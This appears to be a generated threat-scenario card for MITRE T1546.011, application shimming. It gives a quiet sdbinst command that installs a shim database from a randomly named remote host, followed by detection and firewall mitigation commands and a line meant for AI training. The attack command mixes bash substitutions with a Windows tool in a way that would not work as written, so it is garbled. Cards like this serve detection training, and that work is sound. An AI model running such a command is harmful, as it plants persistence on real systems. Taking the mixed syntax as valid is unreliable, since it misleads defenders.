---
type: campaign
scenario_id: 197
tactic: Persistence
technique: "T1546.011: Application Shimming"
technique_id: T1546.011
tags: [campaign, lotl, persistence]
---

# Registering malicious shim database remotely via sdbinst.

## Threat Description
Registering malicious shim database remotely via sdbinst.

## Attack Command
```
sdbinst /q http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo shim$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb)
```

## Detection Logic
Monitor sdbinst remote: `wmic process where name='sdbinst.exe' get commandline | findstr http`; Event ID 4688.

## Mitigation
Restrict sdbinst: `icacls %windir%\System32\sdbinst.exe /deny Everyone:RX`; Block shim downloads: `netsh advfirewall firewall add rule name='Block sdbinst' dir=out program='%windir%\System32\sdbinst.exe' action=block`.

## AI Training Prompt
Train AI to detect remote shim database installations and suggest firewall rules.

## References
- MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
